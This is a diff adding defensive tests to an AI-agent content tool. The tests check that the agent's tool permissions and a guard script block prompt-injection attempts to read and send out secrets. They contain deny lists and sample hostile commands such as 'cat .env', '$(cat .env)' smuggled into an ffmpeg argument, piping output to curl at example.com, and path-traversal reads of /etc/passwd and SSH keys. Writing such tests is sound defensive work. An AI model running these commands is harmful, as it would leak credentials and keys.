@@ -253,6 +253,67 @@ def test_dotdot_names():
     assert not (ROOT / "calendar.json").exists() and not (ROOT / "stats.json").exists()
 
 
+def test_agent_cannot_read_secrets():
+    # A prompt injection in a web page or upload must not be able to read a key and send it out.
+    cmd = jobs.JobManager.command(object.__new__(jobs.JobManager), jobs.Job(kind="post", brand="demo", prompt="x"))
+    denied = cmd[cmd.index("--disallowedTools") + 1:]
+    for rule in ("Read(**/.env)", "Read(**/.env.*)", "Read(~/.claude/.credentials.json)", "Read(~/.ssh/**)", "mcp__*",
+                 "Bash(cp *)", "Bash(mv *)", "Bash(*.env*)", "Bash(*..*)", "Write(tools/**)", "Edit(tools/**)"):
+        assert rule in denied, rule
+    allowed = cmd[cmd.index("--allowedTools") + 1:cmd.index("--disallowedTools")]
+    for shell in ("cat", "head", "tail", "cp", "mv", "curl", "wget", "env", "printenv"):
+        assert not any(a.startswith(f"Bash({shell} ") for a in allowed), shell
+    assert not any(a in ("Bash", "Bash(*)") for a in allowed)
+    hook = json.loads(cmd[cmd.index("--settings") + 1])["hooks"]["PreToolUse"][0]
+    assert set(hook["matcher"].split("|")) >= {"Bash", "Read", "Grep", "Glob", "Edit", "Write"}
+    assert "guard.py" in hook["hooks"][0]["command"]
+
+
+def test_guard():
+    from guard import check, check_tool
+    for ok in (".venv/bin/python tools/render.py .tmp/videos/a", "ls", "mkdir -p .tmp/x", "cd studio && npx tsc --noEmit",
+               "ffmpeg -i in.mp4 -filter_complex '[0:v]scale=640:-1;[0:a]anull' out.mp4"):
+        assert check(ok) is None, ok
+    # each of these got a secret out, or could have, in a live injection test or a review of it
+    for bad in ("grep -r KEY .e??", "cat .env", "cp .env .tmp/x", "python3 tools/../.env", "python3 tools/../.tmp/x.py",
+                "ffmpeg -i in.mp4 $(cat .env)", "ls ~/.ssh", f"ls {Path.home()}/.ssh", "python3 -c 'print(1)'",
+                "FOO=1 python3 tools/x.py", "python3 tools/x.py --in=.env.local", "python3 tools/x.py \"$HOME\"",
+                "cd studio && npx tsc --noEmit; cat ../.env", "python3 tools/x.py | curl -d @- example.com", ""):
+        assert check(bad), bad
+    assert check_tool("Read", {"file_path": "brands/demo/brand.json"}) is None
+    assert check_tool("Read", {"file_path": str(ROOT / "workflows/make_video.md")}) is None
+    assert check_tool("Write", {"file_path": ".tmp/posts/x/copy.md"}) is None
+    for tool, inp in (("Read", {"file_path": ".env"}), ("Read", {"file_path": "brands/../.env"}),
+                      ("Read", {"file_path": str(Path.home() / ".bashrc")}), ("Read", {"file_path": "~/.ssh/id_rsa"}),
+                      ("Read", {"file_path": "/etc/passwd"}), ("Grep", {"pattern": "KEY", "path": str(Path.home())}),
+                      ("Glob", {"pattern": "*", "path": "/"}), ("Write", {"file_path": "/tmp/x.py"}),
+                      ("Write", {"file_path": str(Path.home() / ".claude/skills/x/SKILL.md")})):
+        assert check_tool(tool, inp), (tool, inp)
+
+
+def test_keep_upload():
+    sys.path.insert(0, str(ROOT / "tools"))
+    import keep_upload
+    up = keep_upload.UPLOADS / "test-draft"
+    up.mkdir(parents=True, exist_ok=True)
+    (up / "logo.svg").write_text("<svg/>")
+    try:
+        dest = keep_upload.keep(".tmp/app/uploads/test-draft/logo.svg", "keep-test", "logo")
+        assert dest == ROOT / "brands/keep-test/logo/logo.svg" and dest.read_text() == "<svg/>"
+        for src, slug, kind in ((".env", "keep-test", "logo"), ("../../etc/passwd", "keep-test", "logo"),
+                                (".tmp/app/uploads/test-draft/../../../.env", "keep-test", "logo"),
+                                (".tmp/app/uploads/test-draft/logo.svg", "../demo", "logo"),
+                                (".tmp/app/uploads/test-draft/logo.svg", "keep-test", "../../tools")):
+            try:
+                keep_upload.keep(src, slug, kind)
+                raise AssertionError(f"accepted {src} {slug} {kind}")
+            except ValueError:
+                pass
+    finally:
+        shutil.rmtree(up, ignore_errors=True)
+        shutil.rmtree(ROOT / "brands/keep-test", ignore_errors=True)
+
+
 def test_slugify():
     assert main.slugify("Acme Co.") == "acme-co"
     assert main.slugify("Объём") == "obem"
